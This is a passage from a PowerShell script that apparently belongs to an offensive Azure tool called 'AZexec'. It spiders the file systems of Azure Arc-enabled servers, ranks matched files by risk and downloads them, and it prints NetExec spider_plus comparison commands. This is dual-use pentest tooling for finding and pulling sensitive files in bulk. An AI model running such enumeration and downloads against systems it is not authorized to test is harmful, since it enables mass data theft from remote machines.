                Write-ColorOutput -Message "[!] Error retrieving devices: $errorMessage" -Color "Red"
            }
            continue
        }

        if ($devices.Count -eq 0) {
            Write-ColorOutput -Message "[*] No connected devices found`n" -Color "Yellow"
            continue
        }

        $totalDevices += $devices.Count

        foreach ($device in $devices) {
            $deviceName = $device.Name
            $deviceRG = $device.ResourceGroupName
            $osType = [string]$device.OsType
            $deviceLocation = $device.Location

            Write-ColorOutput -Message "`n[*] Device: $deviceName" -Color "White"
            Write-ColorOutput -Message "    Resource Group: $deviceRG | OS: $osType | Location: $deviceLocation" -Color "Gray"
            Write-ColorOutput -Message "    [*] Enumerating file system..." -Color "Yellow"

            # Get directory listing
            $files = Get-DeviceDirectoryListing -MachineName $deviceName -ResourceGroup $deviceRG `
                -Location $deviceLocation -OSType $osType -StartPath $StartPath `
                -ExcludePaths $ExcludePaths -MaxDepth $Depth

            Write-ColorOutput -Message "    [+] Found $($files.Count) files" -Color "Green"

            foreach ($file in $files) {
                $totalFiles++
                $fileName = $file.Name

                # Check pattern match
                $isMatch = Test-FilePatternMatch -FileName $fileName -Pattern $Pattern

                if ($isMatch) {
                    $totalMatchedFiles++
                    $riskLevel = Get-FileRiskLevel -FileName $fileName
                    $sizeFormatted = Format-FileSize -Bytes $file.Length

                    # Track risk levels
                    switch ($riskLevel) {
                        "CRITICAL" { $criticalFiles++ }
                        "HIGH" { $highRiskFiles++ }
                        "MEDIUM" { $mediumRiskFiles++ }
                    }

                    # Determine display color
                    $riskColor = switch ($riskLevel) {
                        "CRITICAL" { "Red" }
                        "HIGH" { "Yellow" }
                        "MEDIUM" { "Cyan" }
                        default { "Gray" }
                    }

                    $matchTag = if ($Pattern) { "[MATCH]" } else { "" }
                    $riskTag = if ($riskLevel -ne "LOW") { "[$riskLevel]" } else { "" }

                    # NetExec-style output
                    Write-Host "    AZR    " -NoNewline -ForegroundColor "Magenta"
                    Write-Host "$($deviceName.PadRight(20)) " -NoNewline
                    Write-Host "ARC    " -NoNewline
                    Write-Host "$($file.FullPath.Substring(0, [Math]::Min(50, $file.FullPath.Length)).PadRight(50)) " -NoNewline
                    if ($riskTag) {
                        Write-Host "$riskTag " -NoNewline -ForegroundColor $riskColor
                    }
                    if ($matchTag) {
                        Write-Host "$matchTag " -NoNewline -ForegroundColor "Green"
                    }
                    Write-Host "Size: $sizeFormatted" -ForegroundColor "Gray"

                    # Download if enabled
                    $downloaded = $false
                    if ($Download) {
                        if ($file.Length -le ($MaxFileSize * 1MB)) {
                            $downloaded = Save-SpiderDeviceFile -MachineName $deviceName -ResourceGroup $deviceRG `
                                -Location $deviceLocation -OSType $osType -FilePath $file.FullPath `
                                -OutputFolder $OutputFolder -MaxFileSizeMB $MaxFileSize `
                                -FileSizeBytes $file.Length
                            if ($downloaded) {
                                $totalDownloaded++
                                $totalDownloadedSize += $file.Length
                            }
                        } else {
                            $skippedDueToSize++
                        }
                    }

                    # Add to export data
                    $exportData += [PSCustomObject]@{
                        Subscription = $subscription.Name
                        SubscriptionId = $subscription.Id
                        DeviceName = $deviceName
                        ResourceGroup = $deviceRG
                        OSType = $osType
                        Type = "ArcDevice"
                        FilePath = $file.FullPath
                        FileName = $fileName
                        SizeBytes = $file.Length
                        SizeFormatted = $sizeFormatted
                        RiskLevel = $riskLevel
                        LastModified = $file.LastModified
                        Downloaded = $downloaded
                        PatternMatched = $true
                    }
                }
            }
        }

        Write-ColorOutput -Message "`n[*] Subscription enumeration complete" -Color "Green"
    }

    # Spider Summary
    Write-ColorOutput -Message "`n[*] ========================================" -Color "Cyan"
    Write-ColorOutput -Message "[*] DEVICE SPIDER SUMMARY" -Color "Cyan"
    Write-ColorOutput -Message "[*] ========================================`n" -Color "Cyan"

    Write-ColorOutput -Message "[*] Devices Spidered: $totalDevices" -Color "White"
    Write-ColorOutput -Message "[*] Total Files Scanned: $totalFiles" -Color "White"
    Write-ColorOutput -Message "[*] Pattern Matches: $totalMatchedFiles" -Color $(if ($totalMatchedFiles -gt 0) { "Green" } else { "Gray" })

    Write-ColorOutput -Message "`n[*] RISK BREAKDOWN:" -Color "Yellow"
    Write-ColorOutput -Message "    Critical Files: $criticalFiles" -Color $(if ($criticalFiles -gt 0) { "Red" } else { "Green" })
    Write-ColorOutput -Message "    High Risk Files: $highRiskFiles" -Color $(if ($highRiskFiles -gt 0) { "Yellow" } else { "Green" })
    Write-ColorOutput -Message "    Medium Risk Files: $mediumRiskFiles" -Color $(if ($mediumRiskFiles -gt 0) { "Cyan" } else { "Green" })

    if ($Download) {
        $downloadedSizeFormatted = Format-FileSize -Bytes $totalDownloadedSize
        Write-ColorOutput -Message "`n[*] DOWNLOAD SUMMARY:" -Color "Yellow"
        Write-ColorOutput -Message "    Downloaded: $totalDownloaded files ($downloadedSizeFormatted)" -Color "Green"
        Write-ColorOutput -Message "    Skipped (size limit): $skippedDueToSize files" -Color "Gray"
        Write-ColorOutput -Message "    Output Folder: $OutputFolder" -Color "Cyan"
    }

    # Export if requested
    if ($ExportPath) {
        $stats = @{
            "Subscriptions Scanned" = $subscriptionsToScan.Count
            "Devices Spidered" = $totalDevices
            "Total Files" = $totalFiles
            "Pattern Matches" = $totalMatchedFiles
            "Critical Files (HIGH RISK)" = $criticalFiles
            "High Risk Files" = $highRiskFiles
            "Downloaded" = $totalDownloaded
        }
        Export-EnumerationResults -Data $exportData -ExportPath $ExportPath -Title "Device File System Spider" -Statistics $stats -CommandName "spider" -Description "Azure Arc device file system spider. Equivalent to NetExec spider_plus module for Arc-enabled servers."
    }

    # NetExec comparison
    Write-ColorOutput -Message "`n[*] NETEXEC COMPARISON:" -Color "Yellow"
    Write-ColorOutput -Message "    NetExec: nxc smb 192.168.1.0/24 -u user -p pass --spider" -Color "Gray"
    Write-ColorOutput -Message "    AZexec:  .\azx.ps1 spider -DeviceName arc-server-01" -Color "Gray"
    Write-ColorOutput -Message "`n    NetExec: nxc smb IP -M spider_plus -o DOWNLOAD_FLAG=True" -Color "Gray"
    Write-ColorOutput -Message "    AZexec:  .\azx.ps1 spider -DeviceName arc-server-01 -Download" -Color "Gray"

    return $exportData
}
